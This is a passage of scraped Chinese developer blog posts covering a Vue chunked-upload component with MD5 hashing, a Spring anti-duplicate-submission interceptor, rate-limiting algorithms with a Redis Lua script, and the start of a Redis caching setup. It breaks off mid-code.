26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 \u0026lt;template\u0026gt; \u0026lt;div id=\u0026#34;global-uploader\u0026#34;\u0026gt; \u0026lt;uploader class=\u0026#34;uploader-app\u0026#34; :options=\u0026#34;initOptions\u0026#34; :file-status-text=\u0026#34;fileStatusText\u0026#34; :auto-start=\u0026#34;false\u0026#34; @file-added=\u0026#34;onFileAdded\u0026#34; @file-success=\u0026#34;onFileSuccess\u0026#34; @file-progress=\u0026#34;onFileProgress\u0026#34; @file-error=\u0026#34;onFileError\u0026#34; \u0026gt; \u0026lt;uploader-unsupport\u0026gt;\u0026lt;/uploader-unsupport\u0026gt; \u0026lt;uploader-drop\u0026gt; \u0026lt;uploader-btn \u0026gt;选择文件\u0026lt;/uploader-btn\u0026gt; \u0026lt;span style=\u0026#34;margin-left: 10px\u0026#34;\u0026gt;（支持上传一个或多个文件）\u0026lt;/span\u0026gt; \u0026lt;!--\u0026lt;uploader-btn directory\u0026gt;上传文件夹 \u0026lt;/uploader-btn\u0026gt;--\u0026gt; \u0026lt;/uploader-drop\u0026gt; \u0026lt;!--\u0026lt;uploader-btn id=\u0026#34;global-uploader-btn\u0026#34; ref=\u0026#34;uploadBtnRef\u0026#34;\u0026gt;选择文件\u0026lt;/uploader-btn\u0026gt;--\u0026gt; \u0026lt;!--\u0026lt;span\u0026gt;（支持上传一个或多个文件）\u0026lt;/span\u0026gt;--\u0026gt; \u0026lt;uploader-list\u0026gt; \u0026lt;template #default=\u0026#34;{ fileList }\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;file-panel\u0026#34;\u0026gt; \u0026lt;!--\u0026lt;div class=\u0026#34;file-title\u0026#34;\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;div class=\u0026#34;title\u0026#34;\u0026gt;文件列表\u0026lt;/div\u0026gt;--\u0026gt; \u0026lt;!--\u0026lt;/div\u0026gt;--\u0026gt; \u0026lt;ul class=\u0026#34;file-list\u0026#34;\u0026gt; \u0026lt;li v-for=\u0026#34;file in fileList\u0026#34; :key=\u0026#34;file.id\u0026#34; class=\u0026#34;file-item\u0026#34; \u0026gt; \u0026lt;uploader-file ref=\u0026#34;files\u0026#34; :class=\u0026#34;[\u0026#39;file_\u0026#39; + file.id, customStatus]\u0026#34; :file=\u0026#34;file\u0026#34; :list=\u0026#34;true\u0026#34; \u0026gt;\u0026lt;/uploader-file\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;div v-if=\u0026#34;!fileList.length\u0026#34; class=\u0026#34;no-file\u0026#34;\u0026gt; \u0026lt;!--\u0026lt;Icon icon=\u0026#34;ri:file-3-line\u0026#34; width=\u0026#34;16\u0026#34; /\u0026gt; 暂无待上传文件--\u0026gt; 暂无待上传文件 \u0026lt;/div\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;/uploader-list\u0026gt; \u0026lt;/uploader\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; import useCurrentInstance from \u0026#34;@/utils/currentInstance\u0026#34;; import { generateMD5 } from \u0026#34;@/components/Uploader/utils/md5\u0026#34;; import { ElNotification } from \u0026#34;element-plus\u0026#34;; import { addFileToDrive } from \u0026#34;@/api/drive/drive\u0026#34;; import { checkAuth } from \u0026#34;@/api/admin/user\u0026#34;; const { proxy } = useCurrentInstance(); // TODO 上传组件还有bug 上传成功时动作按钮没有隐藏；后端出现错误上传失败时背景色没变红 // props // emits const emits = defineEmits([\u0026#39;uploadSuccess\u0026#39;]); const drivePath = import.meta.env.VITE_APP_DRIVE_API; const initOptions = { target: drivePath + \u0026#34;/file/breakpoint-upload\u0026#34;, chunkSize: \u0026#39;5242880\u0026#39;, forceChunkSize: true, fileParameterName: \u0026#39;file\u0026#39;, maxChunkRetries: 3, // 是否开启服务器分片校验 testChunks: true, // 服务器分片校验函数，秒传及断点续传基础 checkChunkUploadedByResponse: function (chunk, message) { let skip = false // console.log(\u0026#34;checkChunkUploadedByResponse chunk:\u0026#34;, chunk); // console.log(\u0026#34;checkChunkUploadedByResponse message:\u0026#34;, message); try { let objMessage = JSON.parse(message) // console.log(\u0026#34;objMessage:\u0026#34;, objMessage); if (objMessage.code === 200) { if (objMessage.data.skipUpload) { skip = true } else if (objMessage.data.missChunks == null){ skip = false; } else { skip = (objMessage.data.missChunks || []).indexOf(chunk.offset.toString()) \u0026lt; 0 } } } catch (e) {} // console.log(\u0026#34;skip: \u0026#34; + chunk.offset + \u0026#34; \u0026#34; + skip); return skip }, query: (file, chunk) =\u0026gt; { // console.log(\u0026#34;query:\u0026#34;, file); return { ...file.params } } } const customStatus = ref(\u0026#39;\u0026#39;) const fileStatusText = { success: \u0026#39;上传成功\u0026#39;, error: \u0026#39;上传失败\u0026#39;, uploading: \u0026#39;上传中\u0026#39;, paused: \u0026#39;已暂停\u0026#39;, waiting: \u0026#39;等待上传\u0026#39; } // const uploaderRef = ref() // const uploader = computed(() =\u0026gt; uploaderRef.value?.uploader) async function onFileAdded(file) { // 判断用户是否已经登录了，登录才可以添加 await checkAuth(); // 暂停文件 // 选择文件后暂停文件上传，上传时手动启动 file.pause() // console.log(\u0026#34;onFileAdded file: \u0026#34;, file); // panelShow.value = true // trigger(\u0026#39;fileAdded\u0026#39;) // 将额外的参数赋值到每个文件上，以不同文件使用不同params的需求 // file.params = customParams.value // 计算MD5 const md5 = await computeMD5(file) startUpload(file, md5) } function computeMD5(file) { // 文件状态设为\u0026#34;计算MD5\u0026#34; statusSet(file.id, \u0026#39;md5\u0026#39;) // 计算MD5时隐藏\u0026#34;开始\u0026#34;按钮 nextTick(() =\u0026gt; { // document.querySelector(`.file_${file.id} .uploader-file-resume`).style.display = \u0026#39;none\u0026#39; document.querySelector(`.file_${file.id} .uploader-file-actions`).style.display = \u0026#39;none\u0026#39; }) // 开始计算MD5 return new Promise((resolve, reject) =\u0026gt; { generateMD5(file, { onProgress(currentChunk, chunks) { // 实时展示MD5的计算进度 nextTick(() =\u0026gt; { const md5ProgressText = \u0026#39;校验MD5 \u0026#39; + ((currentChunk / chunks) * 100).toFixed(0) + \u0026#39;%\u0026#39; document.querySelector(`.custom-status-${file.id}`).innerText = md5ProgressText }) }, onSuccess(md5) { statusRemove(file.id) resolve(md5) }, onError() { error(`文件${file.name}读取出错，请检查该文件`) file.cancel() statusRemove(file.id) reject() } }) }) } // md5计算完毕，开始上传 function startUpload(file, md5) { file.uniqueIdentifier = md5 file.resume() } function onFileProgress(rootFile, file, chunk) { console.log( `上传中 ${file.name}，chunk：${chunk.startByte / 1024 / 1024} ~ ${ chunk.endByte / 1024 / 1024 }` ) } const onFileError = (rootFile, file, response, chunk) =\u0026gt; { // console.log(\u0026#39;error\u0026#39;, file) error(response) } function error(msg) { ElNotification({ title: \u0026#39;错误\u0026#39;, message: msg, type: \u0026#39;error\u0026#39;, duration: 2000 }) } const onFileSuccess = (rootFile, file, response, chunk) =\u0026gt; { // console.log(\u0026#34;上传成功\u0026#34;) // console.log(\u0026#34;rootFile\u0026#34;,rootFile) // file的relativePath是文件夹的相对路径(如果上传的是文件夹的话) // console.log(\u0026#34;file\u0026#34;,file) // console.log(\u0026#34;response\u0026#34;,JSON.parse(response)) // console.log(\u0026#34;chunk\u0026#34;,chunk) // addFileToDrive(file.name, file.uniqueIdentifier, file.size).then(() =\u0026gt; { // proxy.$modal.msgSuccess(\u0026#34;文件上传成功\u0026#34;); // }) // 服务端自定义的错误（即http状态码为200，但是是错误的情况），这种错误是Uploader无法拦截的 let res = JSON.parse(response) console.log(\u0026#34;onFileSuccess res:\u0026#34;, res); if (res.code !== 200) { error(res.message) // 文件状态设为“失败” statusSet(file.id, \u0026#39;failed\u0026#39;) return } emits(\u0026#34;uploadSuccess\u0026#34;, file); } /** * 新增的自定义的状态: \u0026#39;md5\u0026#39;、\u0026#39;merging\u0026#39;、\u0026#39;transcoding\u0026#39;、\u0026#39;failed\u0026#39; * @param id * @param status */ function statusSet(id, status) { const statusMap = { md5: { text: \u0026#39;校验MD5\u0026#39;, bgc: \u0026#39;#fff\u0026#39; }, failed: { text: \u0026#39;上传失败\u0026#39;, bgc: \u0026#39;#e2eeff\u0026#39; } } customStatus.value = status nextTick(() =\u0026gt; { const statusTag = document.createElement(\u0026#39;span\u0026#39;) statusTag.className = `custom-status-${id} custom-status` statusTag.innerText = statusMap[status].text statusTag.style.backgroundColor = statusMap[status].bgc // custom-status 样式不生效 // 由于 style脚本 设置了 scoped，深层的样式修改不了 // 通过给当前组件设置一个id，在该id下设置样式，就可以保证样式不全局污染 // statusTag.style.position = \u0026#39;absolute\u0026#39;; // statusTag.style.top = \u0026#39;0\u0026#39;; // statusTag.style.left = \u0026#39;0\u0026#39;; // statusTag.style.right = \u0026#39;0\u0026#39;; // statusTag.style.bottom = \u0026#39;0\u0026#39;; // statusTag.style.zIndex = \u0026#39;1\u0026#39;; const statusWrap = document.querySelector(`.file_${id} .uploader-file-status`) statusWrap.appendChild(statusTag) }) } function statusRemove(id) { customStatus.value = \u0026#39;\u0026#39; nextTick(() =\u0026gt; { const statusTag = document.querySelector(`.custom-status-${id}`) document.querySelector(`.file_${id} .uploader-file-actions`).style.display = \u0026#39;block\u0026#39; statusTag.remove() }) } \u0026lt;/script\u0026gt; md5.js\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 import SparkMD5 from \u0026#39;spark-md5\u0026#39; /** * 分段计算MD5 * @param file {File} * @param options {Object} - onProgress | onSuccess | onError */ export function generateMD5(file, options = {}) { const fileReader = new FileReader() const time = new Date().getTime() const blobSlice = File.prototype.slice || File.prototype.mozSlice || File.prototype.webkitSlice const chunkSize = 10 * 1024 * 1000 const chunks = Math.ceil(file.size / chunkSize) let currentChunk = 0 const spark = new SparkMD5.ArrayBuffer() const loadNext = () =\u0026gt; { let start = currentChunk * chunkSize let end = start + chunkSize \u0026gt;= file.size ? file.size : start + chunkSize fileReader.readAsArrayBuffer(blobSlice.call(file.file, start, end)) } loadNext() fileReader.onload = (e) =\u0026gt; { spark.append(e.target.result) if (currentChunk \u0026lt; chunks) { currentChunk++ loadNext() if (options.onProgress \u0026amp;\u0026amp; typeof options.onProgress == \u0026#39;function\u0026#39;) { options.onProgress(currentChunk, chunks) } } else { let md5 = spark.end() // md5计算完毕 if (options.onSuccess \u0026amp;\u0026amp; typeof options.onSuccess == \u0026#39;function\u0026#39;) { options.onSuccess(md5) } console.log( `MD5计算完毕：${file.name} \\nMD5：${md5} \\n分片：${chunks} 大小:${file.size} 用时：${ new Date().getTime() - time } ms` ) } } fileReader.onerror = function () { console.log(\u0026#39;MD5计算失败\u0026#39;) if (options.onError \u0026amp;\u0026amp; typeof options.onError == \u0026#39;function\u0026#39;) { options.onError() } } } ","permalink":"https://chance7bin.github.io/posts/design/%E6%96%AD%E7%82%B9%E7%BB%AD%E4%BC%A0/","summary":"本篇文章主要内容是分片上传、断点续传、秒传的实现思路 前言 分片： 分片任务是在前端由vue-simple-uploader插件完成，流程：1.前","title":"断点续传"},{"content":"日常开发中我们经常会遇到前端多次请求同一个接口的问题，比如前端没有做遮罩层，用户点击了多次按钮。全指望着用户来等待也并不靠谱，如果各个接口自己进行防止重复提交的逻辑又显得不是十分优雅了，所以，我们就将对应的逻辑抽出来形成一个注解，方便我们的使用。\n设计思路 根据提交的参数跟间隔时间到缓存中查询，判断两次提交的参数是否相同，如果相同且在间隔时间内则算作是重复提交\nRepeatSubmit注解 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 /** * 自定义注解防止表单重复提交 * * @author 7bin * @date 2023/06/13 */ @Inherited @Target(ElementType.METHOD) @Retention(RetentionPolicy.RUNTIME) @Documented public @interface RepeatSubmit { /** * 间隔时间(ms)，小于此时间视为重复提交 */ public int interval() default 5000; /** * 提示消息 */ public String message() default \u0026#34;不允许重复提交，请稍候再试\u0026#34;; } 定义拦截器 首先我们定义了一个抽象类RepeatSubmitInterceptor，对preHandle方法进行了定义，判断方法上是否存在RepeatSubmit 注解\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 @Component public abstract class RepeatSubmitInterceptor implements HandlerInterceptor { @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { if (handler instanceof HandlerMethod) { HandlerMethod handlerMethod = (HandlerMethod) handler; Method method = handlerMethod.getMethod(); RepeatSubmit annotation = method.getAnnotation(RepeatSubmit.class); if (annotation != null) { if (this.isRepeatSubmit(request, annotation)) { ApiResponse ajaxResult = ApiResponse.error(annotation.message()); ServletUtils.renderString(response, JSON.toJSONString(ajaxResult)); return false; } } return true; } else { return true; } } /** * 验证是否重复提交由子类实现具体的防重复提交的规则 * * @param request * @return * @throws Exception */ public abstract boolean isRepeatSubmit(HttpServletRequest request, RepeatSubmit annotation); } 子类中实现父类的isRepeatSubmit方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 /** * 判断请求url和数据是否和上一次相同， * 如果和上次相同，则是重复提交表单。 有效时间为5秒内。 */ @Component public class SameUrlDataInterceptor extends RepeatSubmitInterceptor { public final String REPEAT_PARAMS = \u0026#34;repeatParams\u0026#34;; public final String REPEAT_TIME = \u0026#34;repeatTime\u0026#34;; // 令牌自定义标识 @Value(\u0026#34;${token.header}\u0026#34;) private String header; @Autowired private RedisCache redisCache; @SuppressWarnings(\u0026#34;unchecked\u0026#34;) @Override public boolean isRepeatSubmit(HttpServletRequest request, RepeatSubmit annotation) { String nowParams = \u0026#34;\u0026#34;; if (request instanceof RepeatedlyRequestWrapper) { RepeatedlyRequestWrapper repeatedlyRequest = (RepeatedlyRequestWrapper) request; nowParams = HttpHelper.getBodyString(repeatedlyRequest); } // body参数为空，获取Parameter的数据 if (StringUtils.isEmpty(nowParams)) { nowParams = JSON.toJSONString(request.getParameterMap()); } Map\u0026lt;String, Object\u0026gt; nowDataMap = new HashMap\u0026lt;String, Object\u0026gt;(); nowDataMap.put(REPEAT_PARAMS, nowParams); nowDataMap.put(REPEAT_TIME, System.currentTimeMillis()); // 请求地址（作为存放cache的key值） String url = request.getRequestURI(); // 唯一值（没有消息头则使用请求地址） String submitKey = StringUtils.trimToEmpty(request.getHeader(header)); // 唯一标识（指定key + url + 消息头） String cacheRepeatKey = CacheConstants.REPEAT_SUBMIT_KEY + url + \u0026#34;/\u0026#34; + submitKey; Object sessionObj = redisCache.getCacheObject(cacheRepeatKey); if (sessionObj != null) { Map\u0026lt;String, Object\u0026gt; sessionMap = (Map\u0026lt;String, Object\u0026gt;) sessionObj; if (sessionMap.containsKey(url)) { Map\u0026lt;String, Object\u0026gt; preDataMap = (Map\u0026lt;String, Object\u0026gt;) sessionMap.get(url); if (compareParams(nowDataMap, preDataMap) \u0026amp;\u0026amp; compareTime(nowDataMap, preDataMap, annotation.interval())) { return true; } } } Map\u0026lt;String, Object\u0026gt; cacheMap = new HashMap\u0026lt;String, Object\u0026gt;(); cacheMap.put(url, nowDataMap); redisCache.set(cacheRepeatKey, cacheMap, annotation.interval(), TimeUnit.MILLISECONDS); return false; } /** * 判断参数是否相同 */ private boolean compareParams(Map\u0026lt;String, Object\u0026gt; nowMap, Map\u0026lt;String, Object\u0026gt; preMap) { String nowParams = (String) nowMap.get(REPEAT_PARAMS); String preParams = (String) preMap.get(REPEAT_PARAMS); return nowParams.equals(preParams); } /** * 判断两次间隔时间 */ private boolean compareTime(Map\u0026lt;String, Object\u0026gt; nowMap, Map\u0026lt;String, Object\u0026gt; preMap, int interval) { long time1 = (Long) nowMap.get(REPEAT_TIME); long time2 = (Long) preMap.get(REPEAT_TIME); if ((time1 - time2) \u0026lt; interval) { return true; } return false; } } 值得注意的一个地方\n为什么前面要带一个url拼接submitKey（token）呢？\n1 2 3 4 5 // 唯一值（没有消息头则使用请求地址） String submitKey = StringUtils.trimToEmpty(request.getHeader(header)); // 唯一标识（指定key + url + 消息头） String cacheRepeatKey = CacheConstants.REPEAT_SUBMIT_KEY + url + \u0026#34;/\u0026#34; + submitKey; 原因是有的时候并不是所有的请求都有token，这个时候如果我们不对对应的url进行拦截的话，那么他们就可以在未登录的情况下对某些无需登录却十分耗时的页面进行多次请求，而如果对url也进行了拦截，就不会有这个问题了。可以对这个url的访问次数进行限制了。\n注册拦截器 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 @Configuration public class ResourcesConfig implements WebMvcConfigurer { @Autowired private RepeatSubmitInterceptor repeatSubmitInterceptor; /** * 自定义拦截规则 */ @Override public void addInterceptors(InterceptorRegistry registry) { registry.addInterceptor(repeatSubmitInterceptor).addPathPatterns(\u0026#34;/**\u0026#34;); } } 注册过滤器 构建可重复读取inputStream的request\nFilterConfig\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 @Configuration public class FilterConfig { @SuppressWarnings({ \u0026#34;rawtypes\u0026#34;, \u0026#34;unchecked\u0026#34; }) @Bean public FilterRegistrationBean someFilterRegistration() { FilterRegistrationBean registration = new FilterRegistrationBean(); registration.setFilter(new RepeatableFilter()); registration.addUrlPatterns(\u0026#34;/*\u0026#34;); registration.setName(\u0026#34;repeatableFilter\u0026#34;); registration.setOrder(FilterRegistrationBean.LOWEST_PRECEDENCE); return registration; } } RepeatableFilter\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 /** * Repeatable 过滤器 * * @author 7bin */ public class RepeatableFilter implements Filter { @Override public void init(FilterConfig filterConfig) throws ServletException { } @Override public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException { ServletRequest requestWrapper = null; if (request instanceof HttpServletRequest \u0026amp;\u0026amp; StringUtils.startsWithIgnoreCase(request.getContentType(), MediaType.APPLICATION_JSON_VALUE)) { requestWrapper = new RepeatedlyRequestWrapper((HttpServletRequest) request, response); } if (null == requestWrapper) { chain.doFilter(request, response); } else { chain.doFilter(requestWrapper, response); } } @Override public void destroy() { } } RepeatedlyRequestWrapper\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 /** * 构建可重复读取inputStream的request * * @author 7bin */ public class RepeatedlyRequestWrapper extends HttpServletRequestWrapper { private final byte[] body; public RepeatedlyRequestWrapper(HttpServletRequest request, ServletResponse response) throws IOException { super(request); request.setCharacterEncoding(Constants.UTF8); response.setCharacterEncoding(Constants.UTF8); body = HttpHelper.getBodyString(request).getBytes(Constants.UTF8); } @Override public BufferedReader getReader() throws IOException { return new BufferedReader(new InputStreamReader(getInputStream())); } @Override public ServletInputStream getInputStream() throws IOException { final ByteArrayInputStream bais = new ByteArrayInputStream(body); return new ServletInputStream() { @Override public int read() throws IOException { return bais.read(); } @Override public int available() throws IOException { return body.length; } @Override public boolean isFinished() { return false; } @Override public boolean isReady() { return false; } @Override public void setReadListener(ReadListener readListener) { } }; } } 注解使用 在controller中对需要设置防重复提交的方法加上@RepeatSubmit\n1 2 3 4 5 6 7 8 9 /** * 修改用户 */ @RepeatSubmit @PutMapping(\u0026#34;/profile\u0026#34;) public ApiResponse updateProfile(@RequestBody SysUser user) { ... } ","permalink":"https://chance7bin.github.io/posts/design/%E9%98%B2%E9%87%8D%E5%A4%8D%E6%8F%90%E4%BA%A4/","summary":"日常开发中我们经常会遇到前端多次请求同一个接口的问题，比如前端没有做遮罩层，用户点击了多次按钮。全指望着用户来等待也并不靠谱，如果各个接口自","title":"防重复提交"},{"content":"针对软件系统来说，限流就是对请求的速率进行限制，避免瞬时的大量请求击垮软件系统。毕竟，软件系统的处理能力是有限的。如果说超过了其处理能力的范围，软件系统可能直接就挂掉了。\n限流可能会导致用户的请求无法被正确处理，不过，这往往也是权衡了软件系统的稳定性之后得到的最优解。\n现实生活中，处处都有限流的实际应用，就比如排队买票是为了避免大量用户涌入购票而导致售票员无法处理\n常见限流算法 固定窗口计数器算法 固定窗口其实就是时间窗口。固定窗口计数器算法 规定了我们单位时间处理的请求数量。\n假如我们规定系统中某个接口 1 分钟只能访问 33 次的话，使用固定窗口计数器算法的实现思路如下：\n给定一个变量 counter 来记录当前接口处理的请求数量，初始值为 0（代表接口当前 1 分钟内还未处理请求）。 1 分钟之内每处理一个请求之后就将 counter+1 ，当 counter=33 之后（也就是说在这 1 分钟内接口已经被访问 33 次的话），后续的请求就会被全部拒绝。 等到 1 分钟结束后，将 counter 重置 0，重新开始计数。 这种限流算法无法保证限流速率，因而无法保证突然激增的流量。\n就比如说我们限制某个接口 1 分钟只能访问 1000 次，该接口的 QPS 为 500，前 55s 这个接口 1 个请求没有接收，后 1s 突然接收了 1000 个请求。然后，在当前场景下，这 1000 个请求在 1s 内是没办法被处理的，系统直接就被瞬时的大量请求给击垮了。\n滑动窗口计数器算法 滑动窗口计数器算法 算的上是固定窗口计数器算法的升级版。\n滑动窗口计数器算法相比于固定窗口计数器算法的优化在于：它把时间以一定比例分片\n漏桶算法 我们可以把发请求的动作比作成注水到桶中，我们处理请求的过程可以比喻为漏桶漏水。我们往桶中以任意速率流入水，以一定速率流出水。当水超过桶流量则丢弃，因为桶容量是不变的，保证了整体的速率。\n实现这个算法，准备一个队列用来保存请求，然后我们定期从队列中拿请求来执行就好了（和消息队列削峰/限流的思想是一样的）。\n令牌桶算法 和漏桶算法算法一样，我们的主角还是桶（这限流算法和桶过不去啊）。不过现在桶里装的是令牌了，请求在被处理之前需要拿到一个令牌，请求处理完毕之后将这个令牌丢弃（删除）。我们根据限流大小，按照一定的速率往桶里添加令牌。如果桶装满了，就不能继续往里面继续添加令牌了。\n限流实现 工具类 1.Google Guava 自带的限流工具类 RateLimiter\nRateLimiter 基于令牌桶算法，可以应对突发流量。\n除了最基本的令牌桶算法(平滑突发限流)实现之外，Guava 的RateLimiter还提供了 平滑预热限流 的算法实现。\n平滑突发限流就是按照指定的速率放令牌到桶里，而平滑预热限流会有一段预热时间，预热时间之内，速率会逐渐提升到配置的速率。\nGuava 地址：https://github.com/google/guava\n2.Bucket4j\nBucket4j 是一个非常不错的基于令牌/漏桶算法的限流库\nBucket4j 地址：https://github.com/vladimir-bukhtoyarov/bucket4j\n3.Resilience4j\nResilience4j 是一个轻量级的容错组件，其灵感来自于 Hystrix。自Netflix 宣布不再积极开发 Hystrixopen in new window 之后，Spring 官方和 Netflix 都更推荐使用 Resilience4j 来做限流熔断。\nResilience4j 地址: https://github.com/resilience4j/resilience4j\n自定义实现 实现固定窗口计数器算法\n**Redis+Lua **\n减少了网络开销：我们可以利用 Lua 脚本来批量执行多条 Redis 命令，这些 Redis 命令会被提交到 Redis 服务器一次性执行完成，大幅减小了网络开销。\n原子性：一段 Lua 脚本可以视作一条命令执行，一段 Lua 脚本执行过程中不会有其他脚本或 Redis 命令同时执行，保证了操作不会被其他指令插入或打扰。\nRedisConfig 在redis的配置中编写Lua脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 @Bean public DefaultRedisScript\u0026lt;Long\u0026gt; limitScript() { DefaultRedisScript\u0026lt;Long\u0026gt; redisScript = new DefaultRedisScript\u0026lt;\u0026gt;(); redisScript.setScriptText(limitScriptText()); redisScript.setResultType(Long.class); return redisScript; } /** * 限流脚本 */ private String limitScriptText() { return \u0026#34;local key = KEYS[1]\\n\u0026#34; + \u0026#34;local count = tonumber(ARGV[1])\\n\u0026#34; + \u0026#34;local time = tonumber(ARGV[2])\\n\u0026#34; + \u0026#34;local current = redis.call(\u0026#39;get\u0026#39;, key);\\n\u0026#34; + \u0026#34;if current and tonumber(current) \u0026gt; count then\\n\u0026#34; + \u0026#34; return tonumber(current);\\n\u0026#34; + \u0026#34;end\\n\u0026#34; + \u0026#34;current = redis.call(\u0026#39;incr\u0026#39;, key)\\n\u0026#34; + \u0026#34;if tonumber(current) == 1 then\\n\u0026#34; + \u0026#34; redis.call(\u0026#39;expire\u0026#39;, key, time)\\n\u0026#34; + \u0026#34;end\\n\u0026#34; + \u0026#34;return tonumber(current);\u0026#34;; } RateLimiterAspect 定义一个切面，实现基于注解的流量控制\n1 2 3 4 5 6 7 // 在对应的注解中通过传入参数key的名称，限制次数，过期时间，来进行统计 Long number = redisTemplate.execute(limitScript, keys, count, time); if (StringUtils.isNull(number) || number.intValue() \u0026gt; count) { throw new ServiceException(\u0026#34;访问过于频繁，请稍候再试\u0026#34;); } log.info(\u0026#34;限制请求\u0026#39;{}\u0026#39;,当前请求\u0026#39;{}\u0026#39;,缓存key\u0026#39;{}\u0026#39;\u0026#34;, count, number.intValue(), combineKey); 首先获得对应的key当前存储的值，如果当前存储的值大于限制次数，直接返回，如果不大于，那么此值调用incr命令去做加1操作。 如果加1之后current为1，给它设置一个过期时间，从而保证它在限制时间后可以被销毁，从而进行一个新的统计。\n限流注解 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 @Target(ElementType.METHOD) @Retention(RetentionPolicy.RUNTIME) @Documented public @interface RateLimiter { /** * 限流key */ public String key() default CacheConstants.RATE_LIMIT_KEY; /** * 限流时间,单位秒 */ public int time() default 60; /** * 限流次数 */ public int count() default 100; /** * 限流类型 */ public LimitType limitType() default LimitType.DEFAULT; } ","permalink":"https://chance7bin.github.io/posts/design/%E9%99%90%E6%B5%81/","summary":"针对软件系统来说，限流就是对请求的速率进行限制，避免瞬时的大量请求击垮软件系统。毕竟，软件系统的处理能力是有限的。如果说超过了其处理能力的范","title":"限流"},{"content":"@EnableCaching spring boot提供了比较简单的缓存方案。只要使用 @EnableCaching 即可完成简单的缓存功能。\nhttps://blog.csdn.net/micro_hz/article/details/76599632\n参考博客 Spring的面向切面编程（AOP）\nSpring AOP 实现 Redis 缓存切面\nSpringBoot中通过自定义缓存注解(AOP切面拦截)实现数据库数据缓存到Redis\nSpringBoot + Redis：基本配置及使用\nSpring中自定义注解支持SpEl表达式（仅限在AOP中使用）\n添加依赖 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;!--redis--\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-data-redis\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!--spring2.0集成redis所需common-pool2--\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.commons\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-pool2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.8.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-aspects --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-aspects\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;4.3.14.RELEASE\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; yml配置 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 spring: data: redis: repositories: enabled: false redis: # Redis默认情况下有16个分片，这里配置具体使用的分片，默认是0 database: 0 host: localhost port: 6379 # 连接密码（默认为空） password: # 连接超时时间（毫秒) timeout: 10000ms lettuce: pool: # 连接池最大连接数（使用负值表示没有限制） 默认 8 max-active: 8 # 连接池最大阻塞等待时间（使用负值表示没有限制） 默认 -1 max-wait: -1 # 连接池中的最大空闲连接 默认 8 max-idle: 8 # 连接池中的最小空闲连接 默认 0 min-idle: 0 代码 自定义RedisTemplate 使用fastjson进行序列化\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 package njgis.opengms.portal.config; import com.fasterxml.jackson.annotation.JsonAutoDetect; import 